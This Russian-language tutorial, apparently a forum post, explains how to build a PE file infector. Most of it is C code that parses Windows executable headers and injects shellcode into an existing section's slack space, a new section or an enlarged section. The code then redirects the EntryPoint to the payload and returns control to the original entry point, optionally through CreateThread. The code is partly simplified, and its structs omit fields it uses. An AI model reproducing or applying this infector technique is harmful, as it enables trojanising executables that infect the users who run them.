### Инъекция шеллкода в PE файлы

При работе с патчингом и модификацией PE файлов возникает задача автоматической инъекции шеллкода в исполняемый файл. Разберем код который внедряет шелл, переключает EntryPoint, расширяет секции или добавляет новые.
Весь инфектор делится на несколько частей:
1. Парсер PE файла (чтение DOS/NT Headers, выбор x32/64, важно реализовать отдельные ветки).
2. Инъекция в существующие секции или создание новых.
3. Обработка input file, output file, shellcode.

Ниже приложен код упрощенно описывающий структуры, флаги и константы. Применяется __attribute__((packed)) для выравнивания, дефлайны SECTION_CHARACTER_MEM_EXECUTE, SECTION_CHARACTER_EXECUTABLE и тд., e_lfanew в DOS указывает на начало PE заголовка, nt_magic проверяется для подтверждения что это PE, pe_section_header описывает каждую секцию.

#define DOS_MAGIC_VALUE        0x5A4D
#define NT_MAGIC_VALUE         0x00004550

#define SECTION_SHORT_NAME_LENGTH 8
#define SECTION_CHARACTER_EXECUTABLE  0x00000020
#define SECTION_CHARACTER_MEM_EXECUTE 0x20000000
#define SECTION_CHARACTER_MEM_READ    0x40000000
#define DLL_CHARACTER_CAN_MOVE        0x0040
#define DLL_CHARACTER_NX_COMPAT       0x0100
#define IMAGE_RELOCS_STRIPPED         0x0001
#define IMAGE_FILE_DLL                0x2000

#define IMAGE_NT_OPTIONAL_32_MAGIC    0x10b
#define IMAGE_NT_OPTIONAL_64_MAGIC    0x20b

typedef struct pe_dos_header_ {
    uint16_t e_magic;
    uint16_t e_cblp;
    uint32_t e_lfanew; 
} __attribute__((packed)) pe_dos_header;

typedef struct pe_file_header_ {
    uint16_t machine;
    uint16_t number_of_sections;
    uint16_t characteristics;
} __attribute__((packed)) pe_file_header;

typedef struct pe_optional_header_ {
    uint16_t magic;
    uint8_t major_linker_version;
    pe_data_directories data_directories;
} __attribute__((packed)) pe_optional_header;

typedef struct pe64_optional_header_ {
    uint16_t magic;
    uint8_t major_linker_version;
    pe_data_directories data_directories;
} __attribute__((packed)) pe64_optional_header;

typedef struct pe_nt_header_ {
    uint32_t nt_magic;
    pe_file_header nt_file_header;
    pe_optional_header nt_optional_header;
} __attribute__((packed)) pe_nt_header;

typedef struct pe64_nt_header_ {
    uint32_t nt_magic;
    pe_file_header nt_file_header;
    pe64_optional_header nt_optional_header;
} __attribute__((packed)) pe64_nt_header;

// Структуры для хранения секций
typedef struct pe_section_header_ {
    char name[SECTION_SHORT_NAME_LENGTH];
    union {
        uint32_t PhysicalAddress;
        uint32_t VirtualSize;
    } Misc;
    uint32_t VirtualAddress;
    uint32_t Characteristics;
} __attribute__((packed)) pe_section_header;

typedef struct list_pe_section_ {
    pe_section_header header;
    char* data;
    struct list_pe_section_* next;
} list_pe_section;

typedef list_pe_section* list_pe_section_t;

## Парсинг и запись файла

В работе с бинарными заголовками используется функция чтения fread для DOS, далее происходит переход к e_lfanew, чтение NT Header и определение, 32 или 64 бита. После этого собирается структура list_pe_section_t, куда последовательно добавляются секции, сохраняемые в виде списка.
Иногда применяется отдельная функция pe_parse, которая внутри выполняет вызовы fseek64, ftell64 и возвращает ошибки при неправильных сигнатурах или проблемах чтения. Для записи обратно используется алгоритм, где DOS, NT, таблица секций, гэпы между ними, данные всех секций, заливаются обратно в нужном порядке. Это выглядит примерно так: 

int pe_parse(FILE* f, pe_dos_header* dosHeader,
             pe_nt_header* ntHeader, pe64_nt_header* ntHeader64)
{
    if (!f || !dosHeader || !ntHeader || !ntHeader64) {
        return -1;
    }

    // Считывание DOS
    if (fread(dosHeader, sizeof(pe_dos_header), 1, f) == 0) {
        return -2;
    }
    if (dosHeader->e_magic != DOS_MAGIC_VALUE) {
        // Отсутствует MZ
        return -3;
    }

    // Переход к e_lfanew, чтение PE
    if (fseek64(f, dosHeader->e_lfanew, SEEK_SET) < 0) {
        return -4;
    }
    if (fread(ntHeader, sizeof(pe_nt_header), 1, f) == 0) {
        return -5;
    }
    if (ntHeader->nt_magic != NT_MAGIC_VALUE) {
        // Отсутствует PE
        return -6;
    }

    // При обнаружении x64 сигнатуры повторно считывается ntHeader64
    if (ntHeader->nt_optional_header.magic == IMAGE_NT_OPTIONAL_64_MAGIC) {
        if (fseek64(f, dosHeader->e_lfanew, SEEK_SET) < 0) {
            return -7;
        }
        if (fread(ntHeader64, sizeof(pe64_nt_header), 1, f) == 0) {
            return -8;
        }
    }

    return 0;
}

Внимательно нужно сохранять DOS гэп (между DOS заголовком и PE заголовком) и секционный гэп (между таблицей секций и данными первой секции). Это нужно для правильного формирования структуры PE.

## Логика внедрения

Способ 1: Инжекция в существующую секцию
Распространённый способ поиск первой исполняемой секции по флагам SECTION_CHARACTER_EXECUTABLE, проверка наличия дыр или использования места в конце секции (если SizeOfRawData > Misc.VirtualSize). Затем туда прописывается шеллкод, а EntryPoint правится, чтобы при старте управление передавалось инъект коду. Функция возвращает коды ошибок, если что то пошло не так (коллизии с выравниванием, отсутствие места и тд). Фрагмент подобной инъекции x32: 

int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections,
                      unsigned char* xcode, uint32_t xcode_size, int thread_flag)
{
    if (!nt_header || !sections || !xcode || *xcode == '\0') {
        return -1;
    }

    // Поиск PE секции
    list_pe_section_t codeSect = sections;
    while (codeSect) {
        if (codeSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) {
            break;
        }
        codeSect = codeSect->next;
    }
    if (!codeSect) {
        return -2;
    }

    // Определение смещения для вставки
    uint32_t injection_xcode_offset = 0;
    if (codeSect->header.SizeOfRawData > codeSect->header.Misc.VirtualSize) {
        // Если секция имеет байты сверх
        uint32_t delta = codeSect->header.SizeOfRawData - codeSect->header.Misc.VirtualSize;
        if (delta >= nt_header->nt_optional_header.file_alignment) {
            return -3;
        }
        for (uint32_t i = 0; i < delta; i++) {
            if (codeSect->data[codeSect->header.Misc.VirtualSize + i] != '\0') {
                return -4;
            }
        }
        injection_xcode_offset = codeSect->header.Misc.VirtualSize;
    } else {
        // Поиск нулевых DWORD
        uint32_t value = 0;
        for (uint32_t i = 0; i < codeSect->header.SizeOfRawData / sizeof(value); i++) {
            memcpy(&value, codeSect->data + i * sizeof(value), sizeof(value));
            if (value == 0) {
                injection_xcode_offset = (i - 1) * sizeof(value) + 1;
                break;
            }
        }
    }

    // Сдвиг для вставки
    injection_xcode_offset += 0x4;

    // Сохранение и подмена OEP
    uint32_t original_entry_point =
        nt_header->nt_optional_header.address_of_entry_point
        + nt_header->nt_optional_header.image_base;

    nt_header->nt_optional_header.address_of_entry_point =
        codeSect->header.VirtualAddress + injection_xcode_offset;

    // Cхема проста: mov eax, <OEP>; jmp eax; + шеллкод
    // При установке флага thread_flag добавляется вызов CreateThread
    return 0;
}

При установке флага thread_flag шелл не выполняется напрямую, а запускается в новом потоке. Для этого в инъект код добавляются инструкции, которые создают поток, а затем возвращают управление к оригинальной точке входа: 

if (thread_flag) {
    memcpy(codeSect->data + injection_xcode_offset, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
    memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1,
           peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
    // Далее – вставка инструкций вызова и возврата к OEP.
}

Способ 2: Создание новой секции

Иногда удобнее дописать новую секцию, не залезая в существующие. Для этого увеличивается number_of_sections в pe_file_header, резервируется место в конце под новую секцию, куда прописывается шеллкод. Далее EntryPoint переключается, чтобы сначала выполнялся инъект код, а потом возвращался к оригинальному OEP. Код определяет последнюю секцию, вычисляет смещения, выравнивает их по file_alignment и section_alignment, обновляет size_of_image и пишет туда шелл. Пример вставки новой секции для x32 бинаря:

int pe_infect_new_section(pe_nt_header* nt_header, char** file_data, uint32_t* file_size,
                          list_pe_section_t sections, unsigned char* xcode,
                          uint32_t xcode_size, const char* new_section_name, int thread_flag)
{
    if (!nt_header || !sections || !xcode || *xcode == '\0' ||
        !new_section_name || *new_section_name == '\0') {
        return -1;
    }

    // Поиск исполняемой;последней секции
    uint32_t highest_raw_offset = 0, highest_raw_size = 0;
    uint32_t highest_virtual_offset = 0, highest_virtual_size = 0;
    list_pe_section_t curSect = sections;
    list_pe_section_t codeSect = NULL;
    list_pe_section_t lastSect = NULL;

    while (curSect) {
        if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && (!codeSect)) {
            codeSect = curSect;
        }
        if (curSect->header.PointerToRawData > highest_raw_offset) {
            lastSect = curSect;
            highest_raw_offset = lastSect->header.PointerToRawData;
            highest_raw_size = lastSect->header.SizeOfRawData;
        }
        if (curSect->header.VirtualAddress > highest_virtual_offset) {
            highest_virtual_offset = curSect->header.VirtualAddress;
            highest_virtual_size = curSect->header.Misc.VirtualSize;
        }
        curSect = curSect->next;
    }
    if (!codeSect) {
        return -2;
    }

    // Создание структуры для новой секции
    list_pe_section_t newSect = (list_pe_section_t)calloc(1, sizeof(list_pe_section));
    if (!newSect) {
        return -3;
    }

    snprintf(newSect->header.name, SECTION_SHORT_NAME_LENGTH, "%s", new_section_name);
    newSect->header.Misc.VirtualSize = thread_flag ?
        P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
      : P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);

    newSect->header.VirtualAddress =
        P2ALIGNUP(highest_virtual_offset + highest_virtual_size,
                  nt_header->nt_optional_header.section_alignment);

    newSect->header.SizeOfRawData = thread_flag ?
        P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.file_alignment)
      : P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);

    newSect->header.PointerToRawData =
        P2ALIGNUP(highest_raw_offset + highest_raw_size,
                  nt_header->nt_optional_header.file_alignment);

    newSect->header.Characteristics =
        SECTION_CHARACTER_MEM_EXECUTE | SECTION_CHARACTER_MEM_READ | SECTION_CHARACTER_EXECUTABLE;

    *file_data = (char*)realloc(*file_data, *file_size + newSect->header.SizeOfRawData);
    if (!(*file_data)) {
        free(newSect);
        return -4;
    }

    newSect->data = *file_data + newSect->header.PointerToRawData;
    memset(newSect->data, 0, newSect->header.SizeOfRawData);

    lastSect->next = newSect;
    nt_header->nt_file_header.number_of_sections++;

    nt_header->nt_optional_header.size_of_image =
        P2ALIGNUP(newSect->header.VirtualAddress + newSect->header.Misc.VirtualSize,
                  nt_header->nt_optional_header.section_alignment);

    // Копирование шелла, проставление jmp, правка EntryPoint
    *file_size += newSect->header.SizeOfRawData;
    return 0;
}

Способ 3: Расширение существующей секции

Этот вариант похож на предыдущий, но без добавления новой записи в таблицу секций. Вместо этого увеличиваются SizeOfRawData и Misc.VirtualSize, следующая секция сдвигается, а в свободное место прописывается шеллкод. Проверяется зазор между секциями, чтобы не перезаписать левые данные. Если места недостаточно, возвращается ошибка.

Важно проверяеть корректность магических чисел (DOS: 0x5A4D, PE: 0x00004550),и наличие достаточного количества нулевых байтов в конце секции для вставки шеллкода. 

В итоге формируется инъектор шеллкода, который парсит PE файл, DOS/NT Header, x32/64. Инъектит код способом вырезки в существующей секции или созданием новой секции или расширением текущей секции. Изменяет EntryPoint, перенаправляя выполнение в инъект код, возвращая поток управления в оригинал OEP.  
Полный код можно посмотреть: 
Пароль: 
